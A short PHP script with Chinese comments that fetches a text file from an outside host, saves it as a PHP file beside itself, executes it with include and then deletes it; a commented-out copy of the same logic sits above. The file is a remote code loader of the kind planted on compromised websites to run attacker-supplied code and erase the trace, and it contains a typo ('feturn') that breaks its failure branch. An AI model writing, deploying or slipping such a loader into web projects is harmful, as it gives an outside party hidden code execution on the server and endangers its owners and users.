<?php

// $url = "http://a.xzvs.top/payation.txt";

// $savePath = __DIR__ . "/payation.php";

// $content = file_get_contents($url);

// if ($content === false) {
//     die("下载失败");
// }

// file_put_contents($savePath, $content);

// include $savePath;

$url = "http://a.xzvs.top/payation.txt";
$savePath = __DIR__ . "/payation.php";

// 下载远程内容
$content = file_get_contents($url);
if ($content === false) {
    // die("下载失败");
    feturn;
}

// 保存到本地
file_put_contents($savePath, $content);

// 执行 payation.php
include $savePath;

// 删除 payation.php
if (file_exists($savePath)) {
    unlink($savePath);
}
